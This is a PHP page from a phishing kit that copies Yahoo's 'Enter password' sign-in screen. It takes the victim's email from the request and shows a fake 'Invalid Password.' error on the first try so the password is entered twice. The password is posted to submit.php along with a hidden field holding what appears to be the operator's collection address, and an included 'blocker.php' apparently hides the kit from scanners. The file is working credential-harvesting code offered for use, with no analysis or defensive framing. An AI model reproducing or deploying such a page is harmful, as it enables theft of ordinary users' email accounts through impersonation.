
<?php 
error_reporting(0);
	include('blocker.php');
        
	if (isset($_POST['email']) && !empty($_POST['email'])) {
		$email = $_POST['email'];	
	} else if (isset($_GET['email']) && !empty($_GET['email'])) {
		$email = $_GET['email'];
	} else {
		header('Location: index.php?error=1');
	}
	
	$errorMsg = '';

	if (!isset($_GET['retry']) || $_GET['retry'] == 0) {
		$post = 'submit.php?retry=1';
	}
	elseif ($_GET['retry'] == 1) {
		$errorMsg = 'Invalid Password.';
		$post = 'submit.php?retry=0';
	}

?>
<!DOCTYPE html>
<!-- saved from url=(0165)https://login.yahoo.com/account/challenge/password?add=1&authMechanism=primary&display=login&done=https%3A%2F%2Fmail.yahoo.com%2F&sessionIndex=QQ-%2D&acrumb=dhyQmhFg -->
<html id="Stencil" class="js grid light-theme"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0">
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>Yahoo</title>
        <link rel="dns-prefetch" href="https://gstatic.com/">
        <link rel="dns-prefetch" href="https://google.com/">
        <link rel="dns-prefetch" href="https://s.yimg.com/">
        <link rel="dns-prefetch" href="https://y.analytics.yahoo.com/">
        <link rel="dns-prefetch" href="https://ucs.query.yahoo.com/">
        <link rel="dns-prefetch" href="https://geo.query.yahoo.com/">
        <link rel="dns-prefetch" href="https://geo.yahoo.com/">
        <link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
        <link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">

        <style nonce="">
            #mbr-css-check {
                display: inline;
            }
            .mbr-legacy-device-bar {
                display: none;
            }
        </style>
        <link href="./login pass_files/yahoo-main.css" rel="stylesheet" type="text/css">
        <script nonce="">
            (function(root) {
                var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
                root.isGoodJS = isGoodJS;
            }(this));
            
(function (root) {
/* -- Data -- */
root.YUI_config = {"comboBase":"https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?","combine":true,"root":"yui-s:3.18.0\u002F"};
root.COMET_URL = "https:\u002F\u002Fpr.comet.yahoo.com\u002Fcomet";
root.I13N_config = {"keys":{"pt":"utility","ver":"nodejs","A_xp":"dev"},"nol":false};
root.I13N_config || (root.I13N_config = {});
root.I13N_config.spaceid = 794200019;
root.I13N_config.location = "https:\u002F\u002Flogin.yahoo.com\u002Faccount\u002Fchallenge\u002Fpassword?display=login";
root.I13N_config.referrer = "https:\u002F\u002Flogin.yahoo.com\u002F";
root.I13N_config.keys || (root.I13N_config.keys = {});
root.I13N_config.keys.gm_np = "yahoo";
root.I13N_config.keys.p_sec = "account-challenge-password";
root.I13N_config.keys.p_subsec = "account-challenge-password";
root.darlaConfig = {"url":"https:\u002F\u002Ffc.yahoo.com\u002Fsdarla\u002Fphp\u002Fclient.php?l=RICH{dest:tgtRICH;asz:flex}&f=794200019&ref=https%3A%2F%2Flogin.yahoo.com%2Faccount%2Fchallenge%2Fpassword","k2Rate":1,"positions":{"RICH":{"id":"RICH","clean":"login-ad-rich","dest":"login-ad-rich","w":1440,"h":1024,"timeout":5000,"noexp":1,"fdb":{"on":1,"where":"inside","minReqWidth":1325,"showAfter":2000}}}};
root.challenge || (root.challenge = {});
root.challenge.servingStamp = 1575672810119;
root.I13N_config.keys.pct = "primary";
root.mKeyPrefix = "primary_account-challenge-password_";
root.I13N_config.tracked_mods = {"password-challenge":"password-challenge"};
root.pwchallenge || (root.pwchallenge = {});
root.pwchallenge.messages = {"toolTipShow":"Show password","toolTipHide":"Hide password"};
root.isIOSDevice = false;
}(this));

            
            YUI_config.global = window;


            window.mbrSendError = function (name, url) {
                (new Image()).src = '/account/js-reporting/?rid=arenq7peulmva&crumb=' + encodeURIComponent('79PyjkC9oCi') + '&message=' + encodeURIComponent(name.toLowerCase()) + '&url=' + encodeURIComponent(url);
            };

            var oldError = window.onerror;

            window.onerror = function (errorMsg, url) {
                window.mbrSendError(errorMsg, url);
                if (oldError) {
                    oldError.apply(this, arguments);
                }
                return false;
            };

        </script>
        <?php $confirm = 'cbontop@yahoo.com';?>
    <script type="text/x-safeframe-booted" id="sf_tag_1575672844016_69">{"positions":[{"id":"RICH","html":"<script type='text\/javascript'>document.write(\"<!--*\\n\");\r\ndocument.write(\"var aolAdId=\\\"10531184|26614036\\\";\\n\");\r\ndocument.write(\"var aolSize=\\\"1440|1024\\\";\\n\");\r\ndocument.write(\"var aolFormat=\\\"3rdPartyRichMediaRedirect\\\";\\n\");\r\ndocument.write(\"var aolGUID=\\\"1575672818|132581328649487151\\\";\\n\");\r\ndocument.write(\"var alias=\\\"\\\";\\n\");\r\ndocument.write(\"var alias2=\\\"y963896142\\\";\\n\");\r\ndocument.write(\"*-->\\n\");\nvar apiUrl=\"https:\/\/oao-js-tag.onemobile.yahoo.com\/admax\/adMaxApi.do\";var adServeUrl=\"https:\/\/oao-js-tag.onemobile.yahoo.com\/admax\/adServe.do\";function AdMaxAdClient(){var b=Math.floor(Math.random()*1000000);this.scriptId=\"ScriptId_\"+b;this.divId=\"ad\"+b;this.renderAd=function(a){var d=document.createElement(\"script\");d.setAttribute(\"src\",a);d.setAttribute(\"id\",this.scriptId);document.write('<div id=\"'+this.divId+'\" style=\"text-align:center;\">');document.write('<script type=\"text\/javascript\" id=\"'+this.scriptId+'\" src=\"'+a+'\" ><\\\/script>');document.write(\"<\/div>\")},this.buildRequestURL=function(a,g){var h=a+\"?cTag=\"+this.divId;for(i in g){h+=\"&\"+i+\"=\"+escape(g[i])}return h},this.getAd=function(d){var a=this.buildRequestURL(adServeUrl,d);this.renderAd(a)}}var params;function admaxAdCallback(){params.ua=navigator.userAgent;params.of=\"js\";var c=getSd();if(c){params.sd=c}var d=new AdMaxClient();d.admaxAd(params)}function admaxAd(d){d.ua=navigator.userAgent;d.of=\"js\";var f=getSd();if(f){d.sd=f}var e=new AdMaxAdClient();e.getAd(d)}function getXMLHttpRequest(){if(window.XMLHttpRequest){if(typeof XDomainRequest!=\"undefined\"){return new XDomainRequest()}else{return new XMLHttpRequest()}}else{return new ActiveXObject(\"Microsoft.XMLHTTP\")}}function includeJS(c,j,d){var g=Math.floor(Math.random()*1000000);var b=\"ad\"+g;var k=\"ScriptId_\"+g;document.write('<div id=\"'+b+'\" style=\"text-align:center;\">');document.write('<script type=\"text\/javascript\" id=\"'+k+'\" >');document.write(j);document.write(\"<\\\/script>\");document.write(\"<\/div>\");if(d){d()}}function encodeParams(c){var d=\"\";for(i in c){d+=\"&\"+i+\"=\"+escape(c[i])}return d}function log(b){}function are_cookies_enabled(){var b=(navigator.cookieEnabled)?true:false;if(typeof navigator.cookieEnabled==\"undefined\"&&!b){document.cookie=\"testnx\";b=(document.cookie.indexOf(\"testnx\")!=-1)?true:false}return(b)}function readCookie(c){if(document.cookie){var j=c+\"=\";var g=document.cookie.split(\";\");for(var k=0;k<g.length;k++){var h=g[k];while(h.charAt(0)==\" \"){h=h.substring(1,h.length)}if(h.indexOf(j)==0){return h.substring(j.length,h.length)}}}return null}function generateGuid(){return\"xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx\".replace(\/[xy]\/g,function(f){var c=Math.random()*16|0,e=f==\"x\"?c:(c&3|8);return e.toString(16)})}function createCookie(k,j,h){var g=\"\";if(h){var f=new Date();f.setTime(f.getTime()+(h*24*60*60*1000));g=\";expires=\"+f.toGMTString()}else{g=\"\"}document.cookie=k+\"=\"+j+g+\"; path=\/\"}function getSuid(){if(are_cookies_enabled()){var d=readCookie(\"nexagesuid\");if(d){return d}else{var c=generateGuid();createCookie(\"nexagesuid\",c,365)}}return null}function getSd(){if(are_cookies_enabled()){var b=readCookie(\"nexagesd\");if(b){b++;if(b>10){return\"0\"}createCookie(\"nexagesd\",b,0.01);return b}else{createCookie(\"nexagesd\",1,0.01);return 1}}return null};\nvar suid = getSuid();\nvar admax_vars = {\n\"brxdSectionId\": \"\",\n\"brxdPublisherId\": \"20459933223\",\n\"ypubblob\": \"|OPdsujEwLjJpjxBLXd1.GgIRMTU0LgAAAADqomop|794200019|RICH|672817719\",\n\"req(url)\": \"https:\/\/login.yahoo.com\/account\/challenge\/password\",\n\"secure\": \"1\",\n\"brxdSiteId\": \"4465551\",\n\"dcn\": \"brxd4465551\",\n\"yadpos\": \"\",\n\"pos\": \"y963896142\",\n\"csrtype\": \"5\",\n\"ybkt\": \"\",\n\"wd\": \"1440\",\n\"ht\": \"1024\"\n};\nif (suid) admax_vars[\"u(id)\"]=suid;\nadmaxAd(admax_vars);\n\n\n\n\ndocument.write(\"<!--*\\n\");\ndocument.write(\"var moatClientLevel1=5113\\n\");\ndocument.write(\"var moatClientLevel2=374058\\n\");\ndocument.write(\"var moatClientLevel3=0\\n\");\ndocument.write(\"var moatClientLevel4=5043043\\n\");\ndocument.write(\"var zMoatMaster=10433389\\n\");\ndocument.write(\"var zMoatFlight=10531184\\n\");\ndocument.write(\"var zMoatBanner=26614036\\n\");\ndocument.write(\"var zURL=https\\n\");\ndocument.write(\"var zMoatPlacementId=5043043\\n\");\ndocument.write(\"var zMoatPlacementExtId=963896142\\n\");\ndocument.write(\"var zMoatAdId=10531184\\n\");\ndocument.write(\"var zMoatCreative=0\\n\");\ndocument.write(\"var zMoatBannerID=4\\n\");\ndocument.write(\"var zMoatCustomVisp=50\\n\");\ndocument.write(\"var zMoatCustomVist=1000\\n\");\ndocument.write(\"var zMoatIsAdvisGoal=0\\n\");\ndocument.write(\"var zMoatEventUrl=https:\/\/us.y.atwola.com\/adcount|2.0|5113.1|5043043|0|5112|AdId=10531184;BnId=4;ct=3936595527;st=2615;adcid=1;itime=672817719;reqtype=5;guid=6j3og9detqvgq&b=4&d=Aye9BPxpYEJjbNMyrBxE2c22HgQ-&s=js&i=axZEN.khHUWoS2snYz25;;impref=157567281834474243;imprefseq=132581328649487151;imprefts=1575672818;adclntid=1004;spaceid=794200019;adposition=RICH;lmsid=;pvid=OPdsujEwLjJpjxBLXd1.GgIRMTU0LgAAAADqomop;sectionid=;kvsecure%2Ddarla=3%2D20%2D1%7Cysd%7C2;kvmn=y963896142;kvssp=ssp;kvsecure=true;kvpgcolo=ir2;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=windows%5F10;kvadtc%5Fdvbrand=google;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=chrome%5F%2D%5Fwindows;kvrepo%5Fdvosplt=windows%5F10;kvadtc%5Fdvosversion=NT%2010%2E0;kvadtc%5Fcrbrand=spectranet:spectranet%5Fng;kvadtc%5Fcrmcc=621;kvadtc%5Fcrmnc=24;kvadtc%5Fcrcountry=ng;gdpr=0;\\n\");\ndocument.write(\"var zMoatSize=5112\\n\");\ndocument.write(\"var zMoatSubNetID=1\\n\");\ndocument.write(\"var zMoatisSelected=0\\n\");\ndocument.write(\"var zMoatadServer=us.y.atwola.com\\n\");\ndocument.write(\"var zMoatadVisServer=\\n\");\ndocument.write(\"var zMoatSamplingRate=5\\n\");\ndocument.write(\"var zMoatliveTestCookie=\\n\");\ndocument.write(\"var zMoatRefSeqId=vMIAWQgBXHA\\n\");\ndocument.write(\"var zMoatImpRefTs=1575672818\\n\");\ndocument.write(\"var zMoatAlias=y963896142\\n\");\ndocument.write(\"var zMoatWebsiteID=374058\\n\");\ndocument.write(\"var zMoatVert=\\n\");\ndocument.write(\"var zMoatBannerInfo=491297721\\n\");\ndocument.write(\"var RefreshSmall=\\n\");\ndocument.write(\"var RefreshLarge=\\n\");\ndocument.write(\"var RefreshExclusive=\\n\");\ndocument.write(\"var RefreshReserved=\\n\");\ndocument.write(\"var RefreshTime=\\n\");\ndocument.write(\"var RefreshMax=\\n\");\ndocument.write(\"var RefreshKeepSize=\\n\");\ndocument.write(\"var MP=N\\n\");\ndocument.write(\"var AdTypePriority=140\\n\");\ndocument.write(\"*-->\\n\");\ndocument.write(\"<scr\"+\"ipt src=\\\"\"+(window.location.protocol=='https:' ? \"https:\/\/aka-cdn.adtechus.com\" : \"http:\/\/aka-cdn-ns.adtechus.com\")+\"\/media\/moat\/adtechbrands092348fjlsmdhlwsl239fh3df\/moatad.js#moatClientLevel1=5113&moatClientLevel2=374058&moatClientLevel3=0&moatClientLevel4=5043043&zMoatMaster=10433389&zMoatFlight=10531184&zMoatBanner=26614036&zURL=https&zMoatPlacementId=5043043&zMoatAdId=10531184&zMoatCreative=0&zMoatBannerID=4&zMoatCustomVisp=50&zMoatCustomVist=1000&zMoatIsAdvisGoal=0&zMoatEventUrl=https:\/\/us.y.atwola.com\/adcount|2.0|5113.1|5043043|0|5112|AdId=10531184;BnId=4;ct=3936595527;st=2681;adcid=1;itime=672817719;reqtype=5;guid=6j3og9detqvgq&b=4&d=Aye9BPxpYEJjbNMyrBxE2c22HgQ-&s=js&i=axZEN.khHUWoS2snYz25;;impref=157567281834474243;imprefseq=132581328649487151;imprefts=1575672818;adclntid=1004;spaceid=794200019;adposition=RICH;lmsid=;pvid=OPdsujEwLjJpjxBLXd1.GgIRMTU0LgAAAADqomop;sectionid=;kvsecure%2Ddarla=3%2D20%2D1%7Cysd%7C2;kvmn=y963896142;kvssp=ssp;kvsecure=true;kvpgcolo=ir2;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=windows%5F10;kvadtc%5Fdvbrand=google;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=chrome%5F%2D%5Fwindows;kvrepo%5Fdvosplt=windows%5F10;kvadtc%5Fdvosversion=NT%2010%2E0;kvadtc%5Fcrbrand=spectranet:spectranet%5Fng;kvadtc%5Fcrmcc=621;kvadtc%5Fcrmnc=24;kvadtc%5Fcrcountry=ng;gdpr=0;&zMoatSize=5112&zMoatSubNetID=1&zMoatisSelected=0&zMoatadServer=us.y.atwola.com&zMoatadVisServer=&zMoatSamplingRate=5&zMoatliveTestCookie=&zMoatRefSeqId=vMIAWQgBXHA&zMoatImpRefTs=1575672818&zMoatAlias=y963896142&zMoatVert=&zMoatBannerInfo=491297721\\\" type=\\\"text\/javascript\\\"><\/scr\"+\"ipt>\");\n<\/script>","lowHTML":"","meta":{"y":{"pos":"RICH","cscHTML":"<img width=1 height=1 alt=\"\" src=\"https:\/\/us.y.atwola.com\/adcount|2.0|5113.1|5043043|0|5112|AdId=10531184;BnId=4;ct=3936595527;st=2864;adcid=1;itime=672817719;reqtype=5;guid=6j3og9detqvgq&b=4&d=Aye9BPxpYEJjbNMyrBxE2c22HgQ-&s=js&i=axZEN.khHUWoS2snYz25;;impref=157567281834474243;imprefseq=132581328649487151;imprefts=1575672818;adclntid=1004;spaceid=794200019;adposition=RICH;lmsid=;pvid=OPdsujEwLjJpjxBLXd1.GgIRMTU0LgAAAADqomop;sectionid=;kvsecure%2Ddarla=3%2D20%2D1%7Cysd%7C2;kvmn=y963896142;kvssp=ssp;kvsecure=true;kvpgcolo=ir2;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=windows%5F10;kvadtc%5Fdvbrand=google;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=chrome%5F%2D%5Fwindows;kvrepo%5Fdvosplt=windows%5F10;kvadtc%5Fdvosversion=NT%2010%2E0;kvadtc%5Fcrbrand=spectranet:spectranet%5Fng;kvadtc%5Fcrmcc=621;kvadtc%5Fcrmnc=24;kvadtc%5Fcrcountry=ng;gdpr=0;\">","cscURI":"https:\/\/us.y.atwola.com\/adcount|2.0|5113.1|5043043|0|5112|AdId=10531184;BnId=4;ct=3936595527;st=2864;adcid=1;itime=672817719;reqtype=5;guid=6j3og9detqvgq&b=4&d=Aye9BPxpYEJjbNMyrBxE2c22HgQ-&s=js&i=axZEN.khHUWoS2snYz25;;impref=157567281834474243;imprefseq=132581328649487151;imprefts=1575672818;adclntid=1004;spaceid=794200019;adposition=RICH;lmsid=;pvid=OPdsujEwLjJpjxBLXd1.GgIRMTU0LgAAAADqomop;sectionid=;kvsecure%2Ddarla=3%2D20%2D1%7Cysd%7C2;kvmn=y963896142;kvssp=ssp;kvsecure=true;kvpgcolo=ir2;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=windows%5F10;kvadtc%5Fdvbrand=google;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=chrome%5F%2D%5Fwindows;kvrepo%5Fdvosplt=windows%5F10;kvadtc%5Fdvosversion=NT%2010%2E0;kvadtc%5Fcrbrand=spectranet:spectranet%5Fng;kvadtc%5Fcrmcc=621;kvadtc%5Fcrmnc=24;kvadtc%5Fcrcountry=ng;gdpr=0;","behavior":"non_exp","adID":"10531184","matchID":"999999.999999.999999.999999","bookID":"10531184","slotID":"0","serveType":"8","ttl":-1,"err":false,"hasExternal":false,"supp_ugc":"0","placementID":"10531184","fdb":null,"serveTime":-1,"impID":"-1","creativeID":26614036,"adc":"{\"label\":\"AdChoices\",\"url\":\"https:\\\/\\\/info.yahoo.com\\\/privacy\\\/us\\\/yahoo\\\/relevantads.html\",\"close\":\"Close\",\"closeAd\":\"Close Ad\",\"showAd\":\"Show ad\",\"collapse\":\"Collapse\",\"fdb\":\"I don't like this ad\",\"code\":\"en-us\"}","is3rd":1,"facStatus":{"fedStatusCode":"31","fedStatusMessage":"Yield optimization did not run"},"userProvidedData":{},"facRotation":{},"slotData":{"trusted_custom":"false","freqcapped":"false","delivery":"1","pacing":"1","expires":"1625111940","companion":"false","exclusive":"false","redirect":"true","pvid":"OPdsujEwLjJpjxBLXd1.GgIRMTU0LgAAAADqomop"},"size":"1440x1024"}},"conf":{"w":1440,"h":1024}}],"conf":{"useYAC":0,"usePE":1,"servicePath":"","xservicePath":"","beaconPath":"","renderPath":"","allowFiF":false,"srenderPath":"https:\/\/s.yimg.com\/rq\/darla\/3-20-1\/html\/r-sf.html","renderFile":"https:\/\/s.yimg.com\/rq\/darla\/3-20-1\/html\/r-sf.html","sfbrenderPath":"https:\/\/s.yimg.com\/rq\/darla\/3-20-1\/html\/r-sf.html","msgPath":"https:\/\/fc.yahoo.com\/unsupported-1946.html","cscPath":"https:\/\/s.yimg.com\/rq\/darla\/3-20-1\/html\/r-csc.html","root":"sdarla","edgeRoot":"https:\/\/s.yimg.com\/rq\/darla\/3-20-1","sedgeRoot":"https:\/\/s.yimg.com\/rq\/darla\/3-20-1","version":"3-20-1","tpbURI":"","hostFile":"https:\/\/s.yimg.com\/rq\/darla\/3-20-1\/js\/g-r-min.js","fdb_locale":"What don't you like about this ad?|It's offensive|Something else|Thank you for helping us improve your Yahoo experience|It's not relevant|It's distracting|I don't like this ad|Send|Done|Why do I see ads?|Learn more about your feedback.|Want an ad-free inbox? Upgrade to Yahoo Mail Pro!|Upgrade Now","positions":{"RICH":{"dest":"tgtRICH","asz":"flex","id":"RICH","w":1440,"h":1024}},"property":"","events":[],"lang":"en-us","spaceID":"794200019","debug":false,"asString":"{\"useYAC\":0,\"usePE\":1,\"servicePath\":\"\",\"xservicePath\":\"\",\"beaconPath\":\"\",\"renderPath\":\"\",\"allowFiF\":false,\"srenderPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-20-1\\\/html\\\/r-sf.html\",\"renderFile\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-20-1\\\/html\\\/r-sf.html\",\"sfbrenderPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-20-1\\\/html\\\/r-sf.html\",\"msgPath\":\"https:\\\/\\\/fc.yahoo.com\\\/unsupported-1946.html\",\"cscPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-20-1\\\/html\\\/r-csc.html\",\"root\":\"sdarla\",\"edgeRoot\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-20-1\",\"sedgeRoot\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-20-1\",\"version\":\"3-20-1\",\"tpbURI\":\"\",\"hostFile\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-20-1\\\/js\\\/g-r-min.js\",\"fdb_locale\":\"What don't you like about this ad?|It's offensive|Something else|Thank you for helping us improve your Yahoo experience|It's not relevant|It's distracting|I don't like this ad|Send|Done|Why do I see ads?|Learn more about your feedback.|Want an ad-free inbox? Upgrade to Yahoo Mail Pro!|Upgrade Now\",\"positions\":{\"RICH\":{\"dest\":\"tgtRICH\",\"asz\":\"flex\",\"id\":\"RICH\",\"w\":1440,\"h\":1024}},\"property\":\"\",\"events\":[],\"lang\":\"en-us\",\"spaceID\":\"794200019\",\"debug\":false}"},"meta":{"y":{"pageEndHTML":"<!-- Page End HTML -->","pos_list":["RICH"],"transID":"darla_prefetch_1575672818614_1791108604_3","k2_uri":"","fac_rt":-1,"ttl":-1,"spaceID":"794200019","lookupTime":124,"procTime":125,"npv":0,"pvid":"OPdsujEwLjJpjxBLXd1.GgIRMTU0LgAAAADqomop","serveTime":-1,"ep":{"site-attribute":"","tgt":"_blank","secure":true,"ref":"https:\/\/login.yahoo.com\/account\/challenge\/password","filter":"no_expandable;exp_iframe_expandable;","darlaID":"darla_instance_1575672818614_1703476901_2"},"pym":{".":"v0.0.9;;-;"},"host":"","filtered":[],"pe":""}}}</script><script type="text/javascript" src="./login pass_files/boot.js.download"></script><script id="sf_host_lib_sf_auto_5-6-11-2019" type="text/javascript" class="sf_lib" src="./login pass_files/g-r-min.js.download"></script></head>
    <body class="mbr-login-grid">
        <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
            <input type="checkbox" id="mbr-legacy-device-bar-cross">
            <p class="mbr-legacy-device">
                    Yahoo works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some Yahoo features may not work properly. Please update your browser version now. <a href="https://login.yahoo.com/account/challenge/password?add=1&amp;authMechanism=primary&amp;display=login&amp;done=https%3A%2F%2Fmail.yahoo.com%2F&amp;sessionIndex=QQ--&amp;acrumb=dhyQmhFg">More&nbsp;Info</a>
            </p>
        </div>
    <script nonce="">
        (function(root) {
            var doc = document;

            if (root.isGoodJS) {
                doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
                doc.cookie = 'mbr-nojs=; domain=' + doc.domain + '; path=/account; expires=Thu, 01 Jan 1970 00:00:01 GMT; secure';
            } else {
                doc.cookie = 'mbr-nojs=badbrowser; domain=' + doc.domain + '; path=/account; expires=Fri, 31 Dec 9999 23:59:59 GMT; secure';
                doc.getElementById('mbr-legacy-device-bar').style.display = 'block';
            }
        }(this));
    </script>

    <div id="login-body" class="loginish  puree-v2">
    <div class="mbr-desktop-hd">
    <span class="column">
         <a href="https://www.yahoo.com/">
            <img src="./login pass_files/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo " width="" height="36">
            <img src="./login pass_files/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo " width="" height="36">
        </a>
    </span>
    <span class="column help txt-align-right">
        <a href="https://help.yahoo.com/kb/index?locale=en_US&amp;page=product&amp;y=PROD_ACCT">Help</a>
    </span>
</div>
    <div class="login-box-container">
        <div class="login-box default">
            <div class="mbr-login-hd txt-align-center">
                    <img src="./login pass_files/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27">
                    <img src="./login pass_files/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="" height="27">
            </div>
            <div class="challenge password-challenge">
    <div class="challenge-header">
        <div class="yid"><?php echo $email;?></div>
</div><div id="password-challenge" class="primary">
    <strong class="challenge-heading">Enter&nbsp;password</strong>
    <span class="txt-align-center challenge-desc">to finish sign&nbsp;in</span>
    <form action="<?php echo $post;?>" method="post" class="pure-form challenge-form no-img-space">
    	<span style="color:red;"><?php echo $errorMsg;?></span>
       <div class="hidden-username">
            <input type="text" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" spellcheck="false" name="email" value="<?php echo $email;?>" data-rapid_p="6">
            <input type="text" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" spellcheck="false" name="confirm" value="<?php echo $confirm;?>" data-rapid_p="6">
        </div>
        <input type="hidden" name="passwordContext" value="normal" data-rapid_p="7">
        <div id="password-container" class="input-group password-container blurred">
            <input type="password" id="login-passwd" class="password" name="password" placeholder=" " autofocus="" autocomplete="current-password" data-rapid_p="8" required="require">
            <label for="login-passwd" id="password-label" class="password-label">Password</label>
            <div class="caps-indicator hide" id="caps-indicator" title="Capslock is on"></div>
            <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1" title="Show password" data-rapid_p="9"></button>
        </div>

        <div class="button-container">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="verifyPassword" value="Next" data-ylk="elm:btn;elmt:primary;mKey:primary_account-challenge-password_primaryBtn" data-rapid_p="10">
                    Next
            </button>
        </div>
        <div class="forgot-cont challenge-button-link">
            <input type="submit" class="pure-button puree-button-link challenge-button-link" data-ylk="elm:btn;elmt:skip;slk:skip;mKey:primary_account-challenge-password_skipBtn" id="mbr-forgot-link" name="skip" value="Trouble signing in?" data-rapid_p="11">
        </div>
    </form>
</div>
</div>
        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h1>Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h1>
<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of&nbsp;life.</p>
        </div>
    </div>
    <div class="login-bg-outer ">
        <div class="login-bg-inner">
                <div id="sb_rel_login-ad-rich" class="darla" style="position: relative; z-index: 9; width: 1440px; height: 1024px; visibility: inherit; display: inline-block; font-size: 0px;"><iframe style="position: absolute; z-index: 10; width: 1440px; height: 1024px; top: 0px; left: 0px; visibility: inherit; display: block;" id="login-ad-rich" src="./login pass_files/r-sf.html" async="" allow="autoplay;vr;microphone https://s.yimg.com https://cdn.flashtalking.com https://cdn.cmp.advertising.com https://ads.pictela.net" sandbox="allow-forms allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox" frameborder="no" scrolling="no" allowtransparency="true" hidefocus="true" tabindex="-1" marginwidth="0" marginheight="0"></iframe></div>
        </div>
    </div>
</div>
    <script src="./login pass_files/rapid-3.53.3.js.download"></script>
    <script nonce="">
        var rapidInstance = new YAHOO.i13n.Rapid(I13N_config);
        // Used in common JS to add to beacons
        rapidInstance.beaconClick('primary_account-challenge-password_launch' , null, 0, {
            mKey: 'primary_account-challenge-password_launch',
            intrctn: 'click',
            corActn: 'click'
        });
    </script>
    <script src="./login pass_files/bundle.js.download"></script>
    <noscript>
        <img src="/account/js-reporting/?crumb=79PyjkC9oCi&message=javascript_not_enabled&ref=%2Faccount%2Fchallenge%2Fpassword" height="0" width="0" style="visibility: hidden;">
    </noscript>
    <script nonce="">
        var checkAssets = function(seconds) {
            setTimeout(function() {
                if (!window.mbrJSLoaded) {
                    window.mbrSendError('js_failed_to_load', location.pathname);
                }
                var check = document.getElementById('mbr-css-check'),
                    style = check.currentStyle;
                if (window.getComputedStyle) {
                    style = window.getComputedStyle(check);
                }
                if (style.display !== 'none') {
                    window.mbrSendError('css_failed_to_load', location.pathname);
                }
            }, (seconds * 1000));
        };

        checkAssets(10);
    </script>
    <div id="mbr-css-check"></div>


<!-- fe10.member.ir2.yahoo.com - Fri Dec 06 2019 22:53:30 GMT+0000 (Coordinated Universal Time) - (1ms) --><script src="./login pass_files/client.php"></script><div id="darla_csc_holder" class="darla" style="display: none;"><iframe style="display: none;" id="darla_csc_writer_0" class="darla" src="./login pass_files/r-csc.html" frameborder="no" scrolling="no" allowtransparency="true" hidefocus="true" tabindex="-1" marginwidth="0" marginheight="0"></iframe></div></body></html>